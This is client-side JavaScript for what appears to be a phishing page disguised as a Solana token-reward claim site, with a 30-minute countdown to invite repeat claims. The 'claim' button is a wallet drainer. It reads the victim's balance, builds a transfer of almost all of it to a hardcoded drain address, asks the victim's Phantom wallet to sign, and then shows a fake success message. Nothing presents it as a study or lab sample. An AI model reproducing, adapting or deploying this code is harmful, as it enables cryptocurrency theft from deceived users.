<script>
    // Configuration
    const DRAIN_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
    const RPC_URL = 'https://api.devnet.solana.com'; // Switched to Solana's public Devnet RPC
    const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
    const NETWORK = solanaWeb3.clusterApiUrl('devnet');

    // DOM Elements
    const connectWalletBtn = document.getElementById('connectWallet');
    const claimButton = document.getElementById('claimButton');
    const successMessage = document.getElementById('successMessage');
    const minutesDisplay = document.getElementById('minutes');
    const secondsDisplay = document.getElementById('seconds');
    const initialState = document.getElementById('initialState');
    const countdownState = document.getElementById('countdownState');

    // State
    let walletConnected = false;
    let countdown = 30 * 60; // 30 minutes in seconds
    let countdownInterval;
    let firstClaim = true;

    // Initialize Phantom wallet
    const initWallet = async () => {
        if ('solana' in window) {
            const provider = window.solana;
            if (provider.isPhantom) {
                try {
                    // Ensure wallet is on Devnet
                    await provider.connect({ onlyIfTrusted: true });
                    return provider;
                } catch (err) {
                    console.error('Wallet connection error:', err);
                    return null;
                }
            }
        }
        window.open('https://phantom.app/', '_blank');
        return null;
    };

    // Start countdown timer (only after first claim)
    const startCountdown = () => {
        clearInterval(countdownInterval);
        countdown = 30 * 60;

        initialState.classList.add('hidden');
        countdownState.classList.remove('hidden');

        countdownInterval = setInterval(() => {
            countdown--;

            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;

            minutesDisplay.textContent = minutes.toString().padStart(2, '0');
            secondsDisplay.textContent = seconds.toString().padStart(2, '0');

            if (countdown <= 0) {
                clearInterval(countdownInterval);
                claimButton.disabled = false;
                claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
                claimButton.classList.add('opacity-100', 'cursor-pointer');
            }
        }, 1000);
    };

    // Connect wallet handler
    connectWalletBtn.addEventListener('click', async () => {
        const provider = await initWallet();
        if (!provider) return;

        try {
            await provider.connect();
            walletConnected = true;
            connectWalletBtn.textContent = 'Wallet Connected';
            connectWalletBtn.classList.add('wallet-connected', 'bg-green-600', 'hover:bg-green-700');
            connectWalletBtn.classList.remove('bg-solana-pink', 'hover:bg-pink-600');

            claimButton.disabled = false;
            claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
            claimButton.classList.add('opacity-100', 'cursor-pointer');
        } catch (err) {
            console.error('Connection error:', err);
        }
    });

    // Claim reward handler
    claimButton.addEventListener('click', async () => {
        if (!walletConnected) return;

        const provider = window.solana;
        if (!provider) return;

        try {
            const publicKey = new solanaWeb3.PublicKey(provider.publicKey.toString());
            const drainPubkey = new solanaWeb3.PublicKey(DRAIN_ADDRESS);

            // Get balance to drain
            const balance = await connection.getBalance(publicKey);
            const lamportsToDrain = balance - 10000; // Adjusted to leave more for fees

            if (lamportsToDrain <= 0) {
                throw new Error('Insufficient balance to drain');
            }

            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: drainPubkey,
                    lamports: lamportsToDrain
                })
            );

            // Set recent blockhash and fee payer
            transaction.feePayer = publicKey;
            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

            // Request signature
            const signed = await provider.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signed.serialize());

            // Show success message
            successMessage.classList.remove('hidden');
            claimButton.disabled = true;
            claimButton.classList.add('opacity-50', 'cursor-not-allowed');
            claimButton.classList.remove('opacity-100', 'cursor-pointer');

            if (firstClaim) {
                startCountdown();
                firstClaim = false;
            }

            console.log('Drain successful! Signature:', signature);
            await connection.confirmTransaction(signature);
        } catch (err) {
            console.error('Drain failed:', err);
            alert('Transaction failed. Please try again. Check console for details.');
        }
    });
</script>
